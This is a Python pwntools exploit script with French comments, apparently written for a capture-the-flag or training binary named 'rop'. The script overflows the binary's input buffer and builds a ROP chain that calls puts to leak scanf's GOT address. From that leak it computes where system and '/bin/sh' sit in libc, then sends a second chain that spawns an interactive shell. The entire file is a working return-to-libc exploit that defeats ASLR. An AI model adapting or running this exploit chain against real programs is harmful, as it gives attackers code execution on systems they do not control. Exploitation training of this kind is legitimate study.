#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


context(arch='i386')
p = 0
b = ELF('./rop')
libc = ELF('/lib32/libc.so.6') # "info sharedlibrary" sous gdb pour conna√Ætre le chemin de votre libc

DEBUG = False

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print buf
    return buf

def start():
    global p, libc, b
    if p is not 0:
        p.close()
    p = process('./rop')
    wait("Input:")

# Modifier les address ici afin que vous ayez le leak des de l'addresse de scanf
addrmain = 0x080491b2
gadget= 0x08049233 
gotscanf = 0x0804c014
pltputs = 0x08049030
padding= "A"*106

start()
log.info("Construct ropchain")
ropchain=padding+p32(pltputs)+p32(gadget)+p32(gotscanf)+p32(addrmain)
log.info("Get scanf leak")
p.sendline(ropchain)

leak=wait('Input:')
leak_scanf = u32(leak[2:6])

libcScanf = 0x00065480
libcSystem = 0x0003e9e0
libcBinSh = 0x0017eaaa

offset = leak_scanf - libcScanf
system = offset + libcSystem
binsh = offset + libcBinSh

log.info("Leak got scanf: "+str(hex(leak_scanf)))
log.info("Leak system: "+str(hex(system)))
log.info("Leak /bin/sh: "+str(hex(binsh)))

log.info("Going for a shell")
ropchain=padding+p32(system)+p32(gadget)+p32(binsh)
p.sendline(ropchain)

# Interactive shell
p.interactive()
